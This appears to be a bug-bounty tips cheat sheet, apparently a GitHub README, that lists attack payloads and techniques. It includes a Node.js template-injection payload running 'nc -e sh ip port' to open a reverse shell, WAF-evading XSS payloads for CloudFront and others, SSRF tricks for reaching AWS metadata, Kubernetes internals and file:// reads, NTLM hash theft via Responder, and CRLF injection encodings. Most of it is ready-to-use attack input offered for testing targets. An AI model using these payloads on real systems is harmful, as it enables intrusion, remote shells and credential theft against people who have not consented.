# General tips
changing Exif metadata of an image can lead to XSS, RCE ...  [learn more](https://gokulvinesh.medium.com/rce-xss-via-image-exif-metadata-dddf33dadb41).
# RCE
1-If you discover a node.js template area, you should try triggerable node payload
`require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`

# XSS
1-The new reportError() function enables a quite amusing XSS vector:
```
window.name='alert(1)'
reportError(name , enerror=eval)
```
2-If you see `returnTo=` in login url , add `javascript:alert(1)` and login > xss alert.<br>
3-Amazon CloudFront WAF sometimes can be easily bypassed with `<svg onload=(alert)(1)` instead of `<svg onload=alert(1)`<br>
4-Bypass Waf <br>
```
<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
```
5-Bypass XSS WAF protection using a comment between a JS function name and parameters
```
<img/src/onerror=alert/*1337*/(1)>
<img/src/onerror=alert//&NewLine;(2)>
<img/src/onerror=alert&sol;**&sol;(3)>
```
<br>
6-Bypass XSS WAF protection using Whitespace Separators between a JS function name and parameters <br>

```
<img/src/onerror=alert&#xFEFF;(1337)>
```
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Whitespace%20Separators.jpeg)

# SSRF
1-Try other URL schemes:<br>
```
• file:// (file read)
• netdoc:// (file read)
• dict://
• gopher://
• jar://
• ldap://
• and more!
```
<br>
You might be able to get file read.
<br>
Or send multi-line requests to gain additional impact
<br>
(Ex: gopher + redis = likely RCE)<br>
<br>

2-Is the target running Windows?

Can't hit internal services?

(Well, try this even if you can)

Try to steal NTLM hashes with Responder.

`/vulnerable?url=http://your-responder-host`
<br><br>
3-Try alternative representations of IP addresses.

IPs can be represented in many ways including:
```
• octal
• decimal
• hexadecimal
• etc.
```
Try different representations.

You might get lucky.
<br><br>
4-Can't hit `169.254.169.254`?

On AWS, "instance-data" resolves to the metadata server.

Try hitting `http://instance-data` instead.
<br><br>
5- Know your target's technologies.

Look at job postings!

You might not be able to hit a meta-data service.

But there are likely other internal services!

(ex: I've pulled data from an internal Elasticsearch instance)
<br><br>
6- Are they using Kubernetes?

Search Burp history for `.default.svc` or `.cluster.local`

If you find references, try to hit them.

Also, try to hit the Kubernetes API: `https://kubernetes.default.svc`
<br><br>
7- In Kubernetes, you should be brute-forcing for:

`HOSTNAME.<some-namespace>.svc.cluster.local`

I often use Burp Intruder: `FUZZ.default.svc.cluster.local`

Need better wordlists?

Scrape helm charts from ArtifactHub.
<br><br>
8- Can't supply a full URL? You can still get SSRF!

If your input is used to build a URL, THINK.

Learn about URL structures.

The following 4 characters have led to many SSRFs:
```
• @
• ?
• #
• ;
```
An example is in the picture:
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/images/img1.jpeg)
<br><br>
9- If your injection is down the path, traverse!
```
GET /vulnerable?id=1234

|> app fetches: http://some-api/api/v1/1234
```
```

GET /vulnerable?id=../../

|> app fetches: http://some-api/api/v1/../../
```

Find an open redirect & you probably have SSRF.

Or likely can hit internal endpoints.

# Rate limit bypass
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
# Line terminators
For XSS / CRLF injection.<br>
🔹LF: %0A (\u000A)<br>
🔹VT: %0B (\u000B)<br>
🔹FF: %0C (\u000C)<br>
🔹CR: %0D (\u000D)<br>
🔹CR+LF: %0D%0A (\u000D\u000A)<br>
🔹NEL: %C2%85 (\u0085)<br>
🔹LS: %E2%80%A8 (\u2028)<br>
🔹PS: %E2%80%A9 (\u2029)<br>
# IDOR:
1-<br>
```
/api/getUser$FUZZ$
-> /api/getUserv1
-> /api/getUserBeta
```
